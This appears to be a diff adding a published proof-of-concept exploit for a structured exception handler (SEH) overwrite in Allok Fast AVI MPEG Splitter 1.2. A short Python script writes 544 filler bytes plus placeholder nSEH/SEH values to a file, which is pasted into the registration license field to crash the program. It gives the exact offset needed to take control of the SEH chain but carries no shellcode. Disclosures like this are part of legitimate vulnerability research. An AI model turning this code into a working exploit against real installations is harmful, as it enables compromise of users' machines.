@@ -1,0 +1,32 @@
+# Exploit Title: Allok Fast AVI MPEG Splitter 1.2 SEH Overwrite POC 
+# Vulnerability Type: SEH Overwrite POC
+# Discovery by: Shubham Singh
+# Known As: Spirited Wolf [Twitter: @Pwsecspirit]
+# Discovey Date: 2018-08-01
+# Software Link: http://www.alloksoft.com/fast_splitter.htm 
+# Tested Version: 1.2
+# Tested on OS: Windows XP Service Pack 3 x86
+
+# Steps to Reproduce: 
+# Run the python exploit.py , Open "exploit.txt" and copy content.
+# Open Fast AVI MPEG Splitter , A registration prompt will appear.
+# In the License field paste the content of "exploit.txt".
+# Press "OK" and B00m Crashed.
+
+#!/usr/bin/env python
+
+# SEH chain of main thread, item 0
+# Address=00129B78
+# SE handler=43434343
+# SEH chain of main thread, item 1
+# Address=42424242
+# SE handler=*** CORRUPT ENTRY ***
+ 
+buffer = "\x41" * 544
+nseh = "\x42\x42\x42\x42"
+seh= "\x43\x43\x43\x43" 
+
+exploit = buffer + nseh + seh 
+f = open ("exploit.txt", "w")
+f.write(exploit)
+f.close()
